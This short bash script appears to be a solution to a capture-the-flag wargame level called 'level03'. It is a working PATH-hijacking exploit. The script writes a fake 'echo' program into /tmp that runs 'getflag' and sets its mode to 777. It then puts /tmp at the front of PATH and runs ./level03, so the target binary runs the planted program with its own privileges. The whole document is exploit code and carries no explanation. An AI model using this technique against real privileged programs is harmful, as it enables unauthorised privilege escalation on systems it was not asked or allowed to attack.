#!/bin/bash

echo '#!/bin/bash' > /tmp/echo
echo "getflag" >> /tmp/echo
chmod 777 /tmp/echo

export PATH=/tmp:$PATH
./level03
